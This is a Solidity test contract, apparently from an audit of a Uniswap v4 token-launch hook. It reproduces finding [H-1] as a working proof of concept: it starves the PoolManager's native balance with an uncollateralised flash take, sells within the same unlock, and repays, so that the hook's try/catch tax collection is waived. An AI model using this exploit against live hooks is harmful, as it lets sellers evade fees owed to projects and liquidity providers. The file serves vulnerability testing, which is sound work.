// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev [H-1] The sell-tax evasion harness. v4's flash accounting lets anyone take a currency with no collateral
/// as long as they settle before the unlock closes, so a seller can drain the singleton's NATIVE balance, run
/// their sell in the same unlock, and repay on the way out. While the singleton is starved, any physical
/// `take` of native ETH reverts (`Currency.transfer` does a raw call and reverts NativeTransferFailed).
///
/// The hook used to collect the sell tax with exactly such a take, wrapped in a try/catch that booked nothing
/// and returned a zero delta — so the fee was not deferred, it was permanently waived. This contract replays
/// that setup verbatim. It also probes a 1-wei native take at the starved moment and records whether it
/// reverted, which pins the mechanism without needing the old contract to compare against.
///
/// TEST-ONLY: never deployed to mainnet.
contract FlashStarveSeller is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable poolManager;

    /// @notice singleton native balance at the moment the sell executes (the starved state)
    uint256 public pmBalanceAtSwap;
    /// @notice true iff a physical native `take` reverted while starved — i.e. the old collection path would have
    /// hit its catch and waived the fee
    bool public physicalTakeRevertedWhileStarved;
    /// @notice native ETH the sell actually delivered to this contract (post-tax)
    uint256 public ethReceived;

    error NotPoolManager();

    constructor(IPoolManager pm) {
        poolManager = pm;
    }

    /// @param key the pad's pool key; currency0 must be native
    /// @param tokenIn exact-input amount of the pad coin to sell
    function attack(PoolKey calldata key, uint256 tokenIn) external payable {
        poolManager.unlock(abi.encode(key, tokenIn));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        if (msg.sender != address(poolManager)) revert NotPoolManager();
        (PoolKey memory key, uint256 tokenIn) = abi.decode(data, (PoolKey, uint256));

        // 1. drain the singleton's native balance — free, uncollateralised, creates a matching debt
        uint256 borrow = address(poolManager).balance;
        poolManager.take(key.currency0, address(this), borrow);
        pmBalanceAtSwap = address(poolManager).balance;

        // 2. prove a physical native take is impossible right now (this is what the hook used to do)
        uint256 probed = 0;
        try poolManager.take(key.currency0, address(this), 1) {
            probed = 1; // singleton still had funds — the starve failed; repaid below so accounting stays clean
        } catch {
            physicalTakeRevertedWhileStarved = true;
        }

        // 3. the sell, in the SAME unlock: token in (currency1), ETH out (currency0)
        BalanceDelta delta = poolManager.swap(
            key,
            SwapParams({
                zeroForOne: false,
                amountSpecified: -int256(tokenIn),
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970342 - 1
            }),
            ""
        );

        // 4. settle the token leg we owe
        uint256 owedToken = uint256(uint128(-delta.amount1()));
        poolManager.sync(key.currency1);
        IERC20(Currency.unwrap(key.currency1)).transfer(address(poolManager), owedToken);
        poolManager.settle();

        // 5. repay the borrowed native (plus the probe wei, if it went through)
        poolManager.settle{value: borrow + probed}();

        // 6. take the sell proceeds. delta.amount0() is the raw output; the hook's afterSwap return delta debits
        //    the tax on top of it, so ask the manager what we are actually owed rather than assuming.
        int256 owedEth = poolManager.currencyDelta(address(this), key.currency0);
        if (owedEth > 0) {
            ethReceived = uint256(owedEth);
            poolManager.take(key.currency0, address(this), ethReceived);
        }
        return "";
    }

    receive() external payable {}
}
